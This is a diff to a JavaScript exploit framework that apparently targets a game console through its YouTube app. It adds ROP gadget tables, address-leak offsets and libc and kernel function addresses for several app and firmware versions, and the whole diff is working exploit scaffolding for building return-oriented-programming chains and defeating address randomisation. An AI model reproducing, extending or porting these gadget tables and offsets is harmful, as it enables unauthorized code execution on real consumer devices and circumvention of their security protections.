@@ -17,10 +17,6 @@ let call_rop;
 let call;
 let syscall;
 
-let sceKernelGetModuleInfoFromAddr;
-let sceKernelAllocateMainDirectMemory;
-let sceKernelMapNamedDirectMemory; 
-
 let Thrd_create;
 let Thrd_join;
 
@@ -28,6 +24,9 @@ let Thrd_join;
 let allocated_buffers = [];
 let eboot_base = 0n;
 let libc_base = 0n;
+let libcobalt_base = 0n;
+let libstarboard_base = 0n;
+
 let libc_strerror;
 let libc_error;
 let return_value_addr;
@@ -41,6 +40,7 @@ let saved_fp = 0n;
 
 let FW_VERSION;
 let TITLE_ID;
+let Y2_VERSION;
 
 const PAGE_SIZE = 0x4000;
 const PHYS_PAGE_SIZE = 0x1000;
@@ -93,7 +93,9 @@ const SA_SIGINFO = 0x4n;
 
 const LIBKERNEL_HANDLE = 0x2001n;
 
-let ROP = {
+let ROP;
+
+let ROP_403 = {
     get pop_rsp()             { return eboot_base + 0x49f7fn;   },
     get pop_rax()             { return eboot_base + 0x2d954n;   },
     get pop_rdi()             { return eboot_base + 0xb0ec5n;   },
@@ -109,6 +111,104 @@ let ROP = {
     get mov_rsp_rbp()         { return eboot_base + 0xb1424n;   },
     get ret()                 { return eboot_base + 0x32n;      },
 };
+
+let ROP_1220 = {
+    get pop_rsp()             { return libcobalt_base + 0xa59cn;   },
+    get pop_rax()             { return libcobalt_base + 0x1ab82n;  },
+    get pop_rdi()             { return libcobalt_base + 0x4cbn;    },
+    get pop_rsi()             { return libcobalt_base + 0x1174n;   },
+    get pop_rdx()             { return libcobalt_base + 0x108f12n; },
+    get pop_rcx()             { return libcobalt_base + 0xc18en;   },
+    get pop_r8()              { return libcobalt_base + 0x1ab81n;  },
+    get pop_r9()              { return libcobalt_base + 0x3bf622n; },
+    get pop_rbp()             { return libcobalt_base + 0xc6n;     },
+    get mov_qword_rdi_rax()   { return libcobalt_base + 0x561bcn;  },
+    get mov_qword_rdi_rdx()   { return libcobalt_base + 0x4f75edn; },
+    get mov_rax_0x200000000() { return libcobalt_base + 0x2c4e10n; },
+    get mov_rsp_rbp()         { return libcobalt_base + 0x7ad24cn; },
+    get ret()                 { return libcobalt_base + 0x42n;     },
+};
+
+let ROP_1320 = {
+    get pop_rsp()             { return libcobalt_base + 0x6f7c7n;  },
+    get pop_rax()             { return libcobalt_base + 0x35942n;  },
+    get pop_rdi()             { return libcobalt_base + 0x54bn;    },
+    get pop_rsi()             { return libcobalt_base + 0x26a5n;   },
+    get pop_rdx()             { return libcobalt_base + 0x81300n;  },
+    get pop_rcx()             { return libcobalt_base + 0x25e9n;   },
+    get pop_r8()              { return libcobalt_base + 0x35941n;  },
+    get pop_r9()              { return libcobalt_base + 0x3d9132n; },
+    get pop_rbp()             { return libcobalt_base + 0xc6n;     },
+    get mov_qword_rdi_rax()   { return libcobalt_base + 0x6fcecn;  },
+    get mov_qword_rdi_rdx()   { return libcobalt_base + 0x510fddn; },
+    get mov_rax_0x200000000() { return libcobalt_base + 0x2de890n; },
+    get mov_rsp_rbp()         { return libcobalt_base + 0x7c79acn; },
+    get ret()                 { return libcobalt_base + 0x31n;     },
+};
+
+
+let Y2_OFFSET;
+
+let Y2_OFFSET_403 = {
+    EBOOT_LEAK : 0xFBC81Fn,
+    LIBC_LEAK1 : 0x2A66660n,
+    LIBC_LEAK2 : 0x851A0n,
+    RSP_OFFSET : 0x8n,
+    
+    get sceMsgDialogTerminate()          { return eboot_base + 0x2A65C60n; },
+    get sceErrorDialogTerminate()        { return eboot_base + 0x2A65C68n; },
+    get sceKernelGetModuleInfoFromAddr() { return libc_base  + 0x113C08n;  },
+    get gettimeofday()                   { return libc_base  + 0x113B18n;  },
+    
+    get libc_strerror()                  { return libc_base  + 0x73520n;   },
+    get libc_error()                     { return libc_base  + 0xCC5A0n;   },
+    
+    get Thrd_create()                    { return libc_base  + 0x4BF0n;    },
+    get Thrd_join()                      { return libc_base  + 0x49F0n;    },
+    
+}
+
+let Y2_OFFSET_1220 = {
+    LIBCOBALT_LEAK : 0x7DFFDFn,
+    LIBSTARBOARD_LEAK1 : 0x1AD05D0n,
+    LIBSTARBOARD_LEAK2 : 0x6D9B0n,
+    LIBC_LEAK1 : 0x99CCD0n,
+    LIBC_LEAK2 : 0x3EE20n,
+    RSP_OFFSET : 0x10n,
+    
+    get sceMsgDialogTerminate()          { return libstarboard_base + 0x99D550n; },
+    get sceErrorDialogTerminate()        { return libstarboard_base + 0x99D558n; },
+    get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x113C08n; },
+    get gettimeofday()                   { return libc_base         + 0x113B18n; },
+    
+    get libc_strerror()                  { return libc_base         + 0x73520n;  },
+    get libc_error()                     { return libc_base         + 0xCC5A0n;  },
+    
+    get Thrd_create()                    { return libc_base         + 0x4BF0n;   },
+    get Thrd_join()                      { return libc_base         + 0x49F0n;   },
+    
+}
+
+let Y2_OFFSET_1320 = {
+    LIBCOBALT_LEAK : 0x7FA73Fn,
+    LIBSTARBOARD_LEAK1 : 0x2483B20n,
+    LIBSTARBOARD_LEAK2 : 0x3D5D0n,
+    LIBC_LEAK1 : 0x52DBA0n,
+    LIBC_LEAK2 : 0x3AD00n,
+    RSP_OFFSET : 0x10n,
+    
+    get sceMsgDialogTerminate()          { return libstarboard_base + 0x52E4D8n; },
+    get sceErrorDialogTerminate()        { return libstarboard_base + 0x52E4E8n; },
+    get sceKernelGetModuleInfoFromAddr() { return libc_base         + 0x19E488n; },
+    get gettimeofday()                   { return libc_base         + 0x19E348n; },
+    
+    get libc_strerror()                  { return libc_base         + 0x6EAC0n;  },
+    get libc_error()                     { return libc_base         + 0x11D1B0n;  },
+    
+    get Thrd_create()                    { return libc_base         + 0x50A0n;   },
+    get Thrd_join()                      { return libc_base         + 0x4EA0n;   },
+    
+}
 
 let SYSCALL = {
     read: 0x3n,
